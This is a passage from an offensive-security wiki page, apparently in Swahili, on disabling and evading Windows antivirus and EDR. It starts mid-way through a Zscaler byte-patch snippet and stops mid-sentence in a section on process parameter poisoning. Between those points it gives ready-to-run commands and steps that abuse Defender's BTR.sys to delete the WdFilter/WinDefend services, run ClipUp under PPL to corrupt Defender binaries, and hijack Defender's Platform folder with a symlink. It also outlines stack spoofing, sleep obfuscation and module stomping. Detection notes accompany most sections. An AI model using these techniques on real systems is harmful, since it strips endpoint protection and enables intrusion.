data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha files za awali na kuanzisha upya service stack:

* **All** posture checks huonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zilizorekebishwa zinaweza kufungua named-pipe RPC endpoints (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata access isiyo na vizuizi kwenye internal network iliyobainishwa na policies za Zscaler.

Case study hii inaonyesha jinsi maamuzi ya trust yanayofanywa upande wa client pekee, pamoja na signature checks rahisi, yanavyoweza kushindwa kwa byte patches chache.

## Unyonyaji wa trusted functionality ya Microsoft Defender `BTR.sys`

Defender's **Boot-Time Removal** driver ni counterexample muhimu kwa BYOVD ya kawaida. `BTR.sys` ni remediation component halali iliyosainiwa na Microsoft, isiyo na memory-corruption bug wala IOCTL interface; baada ya kupata administrator access na `SeLoadDriverPrivilege`, operator anaweza badala yake kuunda remediation transaction yake ya uongo na kupata file/registry operations zilizokusudiwa za Ring-0. Hii ni **post-compromise AV/EDR-neutralization primitive, si initial access wala privilege escalation**, na driver inaweza kutolewa kutoka kwenye `BOOTTIMETOOL` resource ya `MpEngine.dll` ya target yenyewe badala ya kuleta driver ya third-party inayoonekana wazi.<sup>[[36]](#references)</sup>

### Kuandaa one-shot driver

Defender kwa kawaida huandika resource hiyo kama file la nasibu la `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma value ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, hudecrypt na kuvalidate action list, huandika feedback, kisha hurejesha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya execution kufanikiwa ili driver i-unload badala ya kubaki resident. Service iliyoghushiwa huwa na values zifuatazo bainifu.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Stream ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia key isiyobadilika ya baiti 256, hivyo encryption si authorization boundary. Plaintext halali ina global header ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC na transaction ID inayotokana na payload), ikifuatiwa na feedback path ya UTF-16 iliyokatishwa kwa null na idadi yoyote ya items. Kila item ina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na action-specific data inayomalizika kwa **baiti NUL nne kamili**. Kila header/data region hukaguliwa kivyake kwa CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF`, na **bila final XOR** (`~CRC32`); CRC state huwekwa upya kwa kila region.<sup>[[36]](#references)[[37]](#references)</sup>

Action IDs zinazokubaliwa hufichua kernel primitives hizi.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa file, ikiwemo file iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha file kwenye protected path iliyochaguliwa na attacker; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa registry key kwa kurudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/update registry value na uunde key paths zinazokosekana |

Kwa actions 5 na 6, key/value separator iliyo kwenye wire ni **backslash mbili zinazofuatana**; path iliyoumbizwa kwa kawaida haitagawanywa kwa usahihi. Feedback file kwa kiasi kikubwa huakisi request, lakini data baiti nne za kwanza za kila item huwa `NTSTATUS` yake ya matokeo. Kwa actions 1 na 2, ambazo hazina leading flags field, BTR huhamisha path kwenye baiti nne za mwisho zilizotengwa ili kutoa nafasi kwa status hiyo.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow na early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza chain nzima: kutoa `BTR.sys` kutoka kwa Defender ya ndani, kuunda `<random>.sys:changelist` na feedback stream, kuserialize/kukokotoa checksum/kusimba actions zilizounganishwa, kuunda moja kwa moja service registry key, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha ikiwa system-start driver kwa `-trigger boot`. Direct registry staging huepuka njia ya kawaida ya SCM `CreateServiceW` na kwa hiyo **haitoi** service-install Event ID 7045. Artifacts zilizoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` haiwezi kutumika kwa sababu BTR hufanya file I/O kutoka `DriverEntry` kabla ya storage stack na kiungo cha `SystemRoot` kuwa tayari. `Start=1` pamoja na group ya kipaumbele cha juu ya `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini security drivers nyingi zinazoanza na mfumo na huduma za EDR za user-mode bado hazijaanzishwa. Boot-start filters kama `WdFilter` huenda tayari zimepakiwa, lakini BTR inaweza kuondoa binaries zao au service configuration kabla ya start inayofuata, na inaweza kufuta service executables kabla SCM haijazizindua. ELAM haifungi pengo hili kwa sababu BTR huendeshwa baada ya boot-start evaluation na ina Microsoft signature halali.<sup>[[36]](#references)</sup>

Actions nyingi hutekelezwa katika transaction moja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa hard-code: BTR huunda log hii, kisha hutumia ombi lake lenyewe la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka feedback katika `<random>.sys:<random>.dat` kukiruhusu kuondoa driver na streams zote mbili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlations za detection zenye signal kubwa

Rules zinazotegemea signature pekee na Microsoft vulnerable-driver blocklist hazishughulikii matumizi mabaya ya functionality iliyokusudiwa ya BTR. Pendelea behavioral correlations hizi, huku ukitofautisha Defender lineage halali na launcher isiyo ya kawaida.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Uundaji wa `.sys:changelist` ni wa lazima katika BTR staging. `.dat` ADS iliyounganishwa na `.sys` hiyo hiyo inatia shaka zaidi kwa sababu Defender halali kwa kawaida huweka feedback chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** Correlate uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` unaojumuisha `Args=...:changelist` na `Group=Boot Bus Extender`, bila SCM installation event inayolingana.
- **Sysmon 6 -> 23:** Correlate upakiaji wa BTR driver unaojulikana kutoka non-Defender lineage na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa security binaries.
- **Sysmon 11 -> 23:** Toa alert kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na ukague assignment/enabling ya `SeLoadDriverPrivilege`; Microsoft signature pekee haitoshi kutoa trust wakati driver ya security tool inapowekwa na `cmd.exe`, PowerShell, au process isiyojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Ili Kuvuruga AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza signer/level hierarchy ili processes zilizolindwa zenye level sawa au ya juu pekee ziweze kuvurugana. Kwa mtazamo wa offensive, ikiwa unaweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti arguments zake, unaweza kubadilisha functionality salama (k.m., logging) kuwa write primitive yenye vikwazo, inayoungwa mkono na PPL, dhidi ya protected directories zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya process iendeshe kama PPL
- Target EXE (na DLL zozote zilizopakiwa) lazima zisainiwe kwa EKU inayoweza kutumia PPL.
- Process lazima iundwe kwa CreateProcess ikitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Protection level inayooana lazima iombwe na ilingane na signer wa binary (k.m., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Levels zisizo sahihi zitasababisha creation kushindwa.

Tazama pia utangulizi mpana wa PP/PPL na LSASS protection hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua protection level na kupeleka arguments kwa target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Mfumo binary iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hupokea parameter ya kuandika log file kwenye path iliyobainishwa na caller.
- Inapozinduliwa kama PPL process, uandishi wa file hufanyika kwa kutumia ulinzi wa PPL.
- ClipUp haiwezi kuchanganua paths zenye spaces; tumia 8.3 short paths kuelekeza kwenye maeneo yanayolindwa kwa kawaida.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua PPL-capable LOLBIN (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (k.m., CreateProcessAsPPL).
2) Pitisha ClipUp log-path argument ili kulazimisha uundaji wa file katika protected AV directory (k.m., Defender Platform). Tumia 8.3 short names inapohitajika.
3) Ikiwa target binary kwa kawaida huwa open/locked na AV inapokuwa inaendesha (k.m., MsMpEng.exe), panga uandishi ufanyike wakati wa boot kabla AV haijaanza kwa kusakinisha auto-start service inayojiendesha mapema zaidi kwa uhakika. Thibitisha boot ordering kwa Process Monitor (boot logging).
4) Baada ya reboot, uandishi unaoungwa mkono na PPL hufanyika kabla AV haijafunga binaries zake, na hivyo kuharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Vidokezo na masharti
- Huwezi kudhibiti yaliyomo ambayo ClipUp huandika zaidi ya mahali yanapowekwa; primitive hii inafaa zaidi kwa corruption kuliko content injection ya usahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na muda wa reboot.
- Timing ni muhimu: target haipaswi kuwa open; boot-time execution huepuka file locks.

Detections
- Process creation ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa imeanzishwa na non-standard launchers, karibu na boot.
- Services mpya zilizosanidiwa kujianzisha kiotomatiki binaries zenye mashaka na zinazoanza kila mara kabla ya Defender/AV. Chunguza service creation/modification kabla ya failures za Defender startup.
- File integrity monitoring kwenye Defender binaries/Platform directories; file creations/modifications zisizotarajiwa kutoka kwa processes zilizo na protected-process flags.
- ETW/EDR telemetry: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya PPL level na non-AV binaries.

Mitigations
- WDAC/Code Integrity: zuia ni signed binaries zipi zinaweza kuendeshwa kama PPL na chini ya parents gani; zuia ClipUp invocation nje ya legitimate contexts.
- Service hygiene: zuia creation/modification ya auto-start services na monitor start-order manipulation.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza startup errors zinazoashiria binary corruption.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi security tooling ikiwa inaendana na mazingira yako (fanya majaribio kwa kina).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform ambayo itaendeshwa kwa kuorodhesha subfolders zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye lexicographic version string ya juu zaidi (kwa mfano, `4.18.25070.5-0`), kisha huanzisha Defender service processes kutoka humo (ikisasisha service/registry paths ipasavyo). Uchaguzi huu huamini directory entries, zikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye attacker-writable path na kufanikisha DLL sideloading au service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Preconditions
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa kufanya reboot au kuchochea Defender platform re-selection (service restart wakati wa boot)
- Built-in tools pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia writes kwenye folders zake yenyewe, lakini platform selection yake huamini directory entries na kuchagua version ya juu zaidi kwa lexicographic order bila kuthibitisha kuwa target inaelekea kwenye protected/trusted path.

Step-by-step (mfano)
1) Andaa writable clone ya platform folder ya sasa, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda directory symlink ya toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kwamba MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuchunguza path mpya ya process chini ya `C:\TMP\AV\` na service configuration/registry inayoonyesha location hiyo.

Chaguo za Post-exploitation
- DLL sideloading/code execution: Weka/badilisha DLLs ambazo Defender hupakia kutoka kwenye application directory yake ili kutekeleza code katika processes za Defender. Tazama section iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa start inayofuata path iliyosanidiwa isiresolve na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba technique hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuipeleka ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza APIs zilizochaguliwa kupitia attacker-controlled, position-independent code (PIC). Hii inapanua evasion zaidi ya API surface ndogo inayowasilishwa na kits nyingi (kwa mfano, CreateProcessA), na pia inaeneza protections hizo kwa BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Stage PIC blob pamoja na target module kwa kutumia reflective loader (iliyowekwa mwanzoni au companion). PIC lazima ijitegemee yenyewe na iwe position-independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na upatch IAT entries za imports zinazolengwa (kwa mfano, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) zielekee kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya kufanya tail-call kwenda kwenye real API address. Evasions za kawaida zinajumuisha:
- Memory mask/unmask kuzunguka call (kwa mfano, encrypt beacon regions, RWX→RX, badilisha majina/permissions za pages), kisha restore baada ya call.
- Call-stack spoofing: tengeneza stack isiyo na mashaka na ufanye transition kwenda kwenye target API ili call-stack analysis itatue hadi kwenye frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa compatibility, export interface ili Aggressor script (au equivalent) iweze kusajili APIs za ku-hook kwa Beacon, BOFs na post-ex DLLs.

Kwa nini IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia hooked import, bila kurekebisha tool code au kutegemea Beacon ku-proxy APIs maalum.
- Hushughulikia post-ex DLLs: ku-hook LoadLibrary* hukuwezesha ku-intercept module loads (kwa mfano, System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyo hiyo kwenye API calls zao.
- Hurejesha matumizi ya kuaminika ya process-spawning post-ex commands dhidi ya detections zinazotegemea call-stack kwa ku-wrap CreateProcessA/W.

Muhtasari wa IAT hook wa kiwango cha chini (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ziwe ndogo na salama kwa PIC; resolve API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha pages zenye writable+executable.

Call‑stack spoofing stub
- PIC stubs za mtindo wa Draugr huunda call chain bandia (return addresses zinazoelekea kwenye modules zisizo na madhara) kisha pivot kwenda kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Oanisha na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Operational integration
- Weka reflective loader mwanzoni mwa post‑ex DLLs ili PIC na hooks zi-initialize kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia hiyo hiyo ya evasion bila mabadiliko ya code.

Detection/DFIR considerations
- IAT integrity: entries zinazo-resolve kwenda kwenye addresses zisizo za image (heap/anon); verification ya mara kwa mara ya import pointers.
- Stack anomalies: return addresses zisizo za loaded images; transitions za ghafla kwenda kwenye non-image PIC; RtlUserThreadStart ancestry isiyolingana.
- Loader telemetry: writes za ndani ya process kwenda kwenye IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, RX regions zisizotarajiwa zinazoundwa wakati wa load.
- Image-load evasion: ikiwa hooking LoadLibrary* inatumika, monitor loads zinazotiliwa shaka za automation/clr assemblies zinazoendana na matukio ya memory masking.

Related building blocks and examples
- Reflective loaders zinazofanya IAT patching wakati wa load (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ikiwa unadhibiti reflective loader, unaweza ku-hook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na custom resolver inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Jenga **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifree.
- Export function ya `setup_hooks()` inayobadilisha loader's import resolver (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie hash-based hook lookup kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; vinginevyo delegate kwenda kwenye `GetProcAddress` halisi.
- Sajili hook targets wakati wa link time kwa Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook hubaki valid kwa sababu iko ndani ya resident PICO.

Hii huwezesha **import-time IAT redirection** bila kupatch code section ya DLL iliyopakiwa baada ya load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks hu-trigger tu ikiwa function iko kweli kwenye IAT ya target. Ikiwa module inaresolve APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya loader ya `ProcessImports()` iione:

- Badilisha hashed export resolution (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na direct reference kama `&WaitForSingleObject`.
- Compiler hutoa IAT entry, ikiwezesha interception wakati reflective loader inaresolve imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Badala ya kupatch `Sleep`, hook **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, wrap call ndani ya obfuscation chain ya mtindo wa Ekko inayosimba image ya in-memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizotengenezwa.
- Chain ya kawaida (x64): weka image kuwa `PAGE_READWRITE` → RC4 encrypt kupitia `advapi32!SystemFunction032` juu ya mapped image yote → fanya blocking wait → RC4 decrypt → **rejesha per-section permissions** kwa kutembea kwenye PE sections → signal completion.
- `RtlCaptureContext` hutoa template ya `CONTEXT`; clone ndani ya frames nyingi na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili ku-invoke kila step.

Operational detail: rudisha “success” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee wakati image ikiwa masked. Pattern hii huficha module dhidi ya scanners wakati wa idle windows na huepuka signature ya kawaida ya “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts za `CreateTimerQueueTimer` callbacks zinazoelekeza kwenye `NtContinue`.
- `advapi32!SystemFunction032` ikitumika kwenye buffers kubwa zilizo contiguous zenye ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na per-section permission restoration ya custom.

### Runtime CFG registration for sleep-obfuscation gadgets

Kwenye targets zenye CFG, indirect jump ya kwanza kwenda kwenye mid-function gadget kama `jmp [rbx]` au `jmp rdi` kwa kawaida ita-crash process kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye CFG metadata ya module. Ili kuweka chains za mtindo wa Ekko/Kraken zikiendelea ndani ya processes zilizo hardened:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na chain kwa `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na `CFG_CALL_TARGET_VALID` entries.
- Kwa addresses zilizo ndani ya loaded images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ifunike **image size yote**.
- Kwa manually mapped/PIC/stomped regions, tumia **allocation base** na allocation size badala yake.
- Weka alama si dispatch gadget pekee, bali pia exports zinazofikiwa indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na executable sections zozote zinazodhibitiwa na attacker ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo za CFG” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompile kwa `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement inaonekana wazi na inaweza kuvunjika kwenye mifumo ya CET Shadow Stack kwa sababu spoofed `Rip` lazima bado ilingane na hardware shadow stack. Pattern salama zaidi ya sleep-masking ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine ndani ya process hiyo hiyo na usome stack bounds zake za `NT_TIB` / TEB (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya current thread.
- Capture sleeping context halisi kwa `GetThreadContext`.
- Copy **`Rip` halisi pekee** ndani ya spoof context, huku ukiacha spoofed `Rsp`/stack state ikiwa intact.
- Wakati wa sleep window, copy spoof thread's `NT_TIB` ndani ya current TEB ili stack walkers zi-unwind ndani ya legitimate stack range.
- Baada ya wait kwisha, restore TIB ya awali na thread context.

Hii huhifadhi instruction pointer inayolingana na CET huku ikiwapotosha EDR stack walkers wanaoamini TEB stack metadata kuthibitisha unwinds.

### APC-based alternative: Kraken Mask

Ikiwa timer-queue dispatch ina signatures nyingi sana, sleep-encrypt-spoof-restore sequence hiyo hiyo inaweza kutekelezwa kutoka suspended helper thread kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Queue prepared `CONTEXT` frames/APCs kwa `NtQueueApcThread` na zimalize kwa `NtAlertResumeThread`.
- Hifadhi chain state kwenye heap badala ya helper stack ili kuepuka kumaliza default 64 KB thread stack.
- Tumia `NtSignalAndWaitForSingleObject` kusignal start event na ku-block atomically.
- Suspend main thread kabla ya kurestore TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza race window ambayo scanner inaweza kuona stack ikiwa imerejeshwa nusu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` na kuwa signature ya helper-thread/APC huku ikiweka malengo yale yale ya RC4 masking na stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` iliyozungukwa na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja ndani ya TEB/TIB ya current thread kuhusu stack bounds.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazofikia indirectly `SystemFunction032`, `VirtualProtect`, au helpers za section-permission restoration.
- Matumizi yanayorudiwa ya short gadget signatures kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya signed modules.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka **`.text` section ya DLL ambayo tayari ime-map ndani ya target process** badala ya kuallocate private executable memory inayoonekana wazi au kupakia fresh sacrificial DLL. Overwrite target inapaswa kuwa **loaded, disk-backed image** ambayo code space yake inaweza kubeba payload bila kuharibu code paths ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Naive stomping dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si thabiti: DLL inaweza isiwe imepakiwa kwenye remote process, na code region ndogo sana ita-crash process. Workflow ya kuaminika zaidi ni:

1. Enumerate modules za target process na uhifadhi **names-only include list** ya DLLs ambazo tayari zimepakiwa.
2. Build payload kwanza na rekodi **exact byte size** yake.
3. Scan candidate DLLs kwenye disk na linganisha PE section **`.text` `Misc_VirtualSize`** na payload size. Hii ni muhimu zaidi kuliko file size kwa sababu inaonyesha ukubwa wa executable section **inapokuwa mapped kwenye memory**.
4. Parse **Export Address Table (EAT)** na chagua exported function RVA kama stomp start offset.
5. Kadiria **blast radius**: ikiwa payload inazidi boundary ya function iliyochaguliwa, ita-overwrite exports zilizo karibu zilizopangwa baada yake kwenye memory.

Typical recon/selection helpers zinazoonekana kwenye wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Maelezo ya uendeshaji
- Pendelea DLLs **ambazo tayari zimepakiwa** katika remote process ili kuepuka telemetry ya `LoadLibrary`/unexpected image loads.
- Pendelea exports ambazo hutekelezwa mara chache na target application; vinginevyo normal code paths zinaweza kufikia bytes zilizostomp kabla au baada ya thread creation.
- Implants kubwa mara nyingi huhitaji kubadilisha shellcode embedding kutoka string literal hadi **byte-array/braced initializer** ili buffer nzima iwakilishwe kwa usahihi katika injector source.

Mawazo ya detection
- Remote writes zinazoingia kwenye **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya private RWX/RX allocations zinazotumika mara nyingi.
- Export entry points ambazo bytes zake za in-memory hazilingani tena na backing file iliyo kwenye disk.
- Remote threads au context pivots zinazoanza execution ndani ya legitimate DLL export ambayo bytes zake za kwanza zilibadilishwa hivi karibuni.
- Sequences za kutiliwa shaka za `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya DLL `.text` pages zikifuatwa na thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni **process-injection / EDR-evasion** technique inayokwepa classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes ndani ya target inayoendelea kuendesha, inatumia ukweli kwamba Windows **inakili selected `CreateProcessW` startup parameters ndani ya child process** na kuzihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Carriers muhimu ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (with `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vigezo vya vitendo vya carriers:

